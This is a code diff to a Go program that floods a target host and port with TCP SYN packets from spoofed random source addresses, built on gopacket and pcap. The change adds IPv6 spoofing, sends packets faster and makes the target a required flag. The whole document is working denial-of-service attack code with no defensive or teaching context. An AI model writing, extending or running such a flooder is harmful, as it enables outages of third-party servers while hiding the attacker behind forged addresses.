@@ -14,17 +14,6 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
-// Random fake IP address
-func randomIP(randSource *rand.Rand) net.IP {
-	return net.IPv4(
-		byte(1+randSource.Intn(254)),
-		byte(randSource.Intn(256)),
-		byte(randSource.Intn(256)),
-		byte(randSource.Intn(256)),
-	)
-}
-
-// DNS to IP
 var dnsCache = make(map[string]net.IP)
 
 func resolveDNS(domain string) (net.IP, error) {
@@ -44,21 +33,44 @@ func resolveDNS(domain string) (net.IP, error) {
 	return ips[0], nil
 }
 
-// Send SYN flood
-func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.Rand, wg *sync.WaitGroup, handle *pcap.Handle) {
+func randomIPv4(randSource *rand.Rand) net.IP {
+	ip := make(net.IP, 4)
+	randSource.Read(ip)
+	return ip
+}
+
+func randomIPv6(randSource *rand.Rand) net.IP {
+	ip := make(net.IP, 16)
+	randSource.Read(ip)
+	return ip
+}
+
+func sendSynFlood(target net.IP, port uint16, numPackets int, randSource *rand.Rand, wg *sync.WaitGroup, handle *pcap.Handle) {
 	log.Printf("Starting SYN flood on %s:%d with %d packets\n", target, port, numPackets)
 
-	// Loop to send packets
 	for i := 0; i < numPackets; i++ {
 		wg.Add(1)
 		go func(i int) {
-			ipLayer := &layers.IPv4{
-				SrcIP:    randomIP(randSource),
-				DstIP:    net.ParseIP(target),
-				Protocol: layers.IPProtocolTCP,
-			}
+			defer wg.Done()
 
-			log.Printf("Sending packet #%d from %s to %s:%d", i+1, ipLayer.SrcIP, ipLayer.DstIP, port)
+			var ipLayer gopacket.NetworkLayer
+			var srcIP net.IP
+
+			if target.To4() != nil {
+				srcIP = randomIPv4(randSource)
+				ipLayer = &layers.IPv4{
+					SrcIP:    srcIP,
+					DstIP:    target,
+					Protocol: layers.IPProtocolTCP,
+				}
+			} else {
+				srcIP = randomIPv6(randSource)
+				ipLayer = &layers.IPv6{
+					SrcIP:      srcIP,
+					DstIP:      target,
+					NextHeader: layers.IPProtocolTCP,
+				}
+			}
 
 			tcpLayer := &layers.TCP{
 				SrcPort: layers.TCPPort(randSource.Intn(65535)),
@@ -70,16 +82,22 @@ func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.R
 			err := tcpLayer.SetNetworkLayerForChecksum(ipLayer)
 			if err != nil {
 				log.Printf("Failed to set checksum: %v", err)
-				wg.Done()
 				return
 			}
 
 			buffer := gopacket.NewSerializeBuffer()
 			options := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}
-			err = gopacket.SerializeLayers(buffer, options, ipLayer, tcpLayer)
+			switch ip := ipLayer.(type) {
+			case *layers.IPv4:
+				err = gopacket.SerializeLayers(buffer, options, ip, tcpLayer)
+			case *layers.IPv6:
+				err = gopacket.SerializeLayers(buffer, options, ip, tcpLayer)
+			default:
+				log.Printf("Unsupported IP layer type")
+				return
+			}
 			if err != nil {
 				log.Printf("Failed to serialize layers: %v", err)
-				wg.Done()
 				return
 			}
 
@@ -88,20 +106,15 @@ func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.R
 				log.Printf("Failed to send packet: %v", err)
 			}
 
-			log.Printf("Sent packet #%d", i+1)
-			wg.Done()
 		}(i)
 
-		time.Sleep(15 * time.Millisecond)
+		time.Sleep(10 * time.Millisecond)
 	}
-
-	wg.Wait()
-	log.Println("SYN flood completed. Program will now stop.")
 }
 
 func main() {
 	interfaceFlag := flag.String("interface", "en0", "Network interface to use (e.g., en0, eth0, etc.)")
-	targetFlag := flag.String("target", "example.com", "Target domain name or IP address")
+	targetFlag := flag.String("target", "", "Target domain name or IP address")
 	portFlag := flag.Uint("port", 80, "Target port")
 	numPacketsFlag := flag.Int("numPackets", 1000, "Number of packets to send")
 
@@ -114,13 +127,9 @@ func main() {
 	port := uint16(*portFlag)
 	numPackets := *numPacketsFlag
 
-	targetIP := net.ParseIP(target)
-	if targetIP == nil {
-		var err error
-		targetIP, err = resolveDNS(target)
-		if err != nil {
-			log.Fatalf("Error resolving domain: %v", err)
-		}
+	targetIP, err := resolveDNS(target)
+	if err != nil {
+		log.Fatalf("Error resolving domain: %v", err)
 	}
 
 	handle, err := pcap.OpenLive(networkInterface, 1024, false, pcap.BlockForever)
@@ -132,8 +141,8 @@ func main() {
 	log.Printf("Launching SYN Flood on %s:%d with %d packets using interface %s\n", targetIP, port, numPackets, networkInterface)
 
 	var wg sync.WaitGroup
-	sendSynFlood(targetIP.String(), port, numPackets, randSource, &wg, handle)
+	sendSynFlood(targetIP, port, numPackets, randSource, &wg, handle)
 
 	wg.Wait()
-
+	log.Println("SYN flood completed. Program will now stop.")
 }
